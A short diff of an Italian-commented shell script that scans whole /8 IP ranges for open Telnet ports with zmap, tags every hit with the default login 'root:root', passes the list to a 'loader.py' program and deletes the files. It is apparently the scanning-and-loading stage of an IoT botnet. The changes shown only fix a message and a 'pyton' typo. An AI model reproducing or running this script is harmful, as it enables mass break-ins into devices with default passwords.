@@ -13,12 +13,12 @@ while [ "$(printf '%s\n' "$current_ip" "$end_ip" | sort -V | head -n 1)" != "$en
 
     # 1] Inizio scanner
     zmap -p23 "$ip_range/8" -o bios.txt 
-echo ' Converto bios.txt con list '
+echo ' Converto bios.txt con lista1  '
     # 2] Converti il file bios.txt con sed
     sed 's/$/:23 root:root/' bios.txt >> lista1
 
     # 3] Starta il tuo programma
-    pyton loader.py lista1
+    python loader.py lista1
 
     # 4] Elimina i file prima di iniziare un altro range
     rm -rf bios.txt lista1
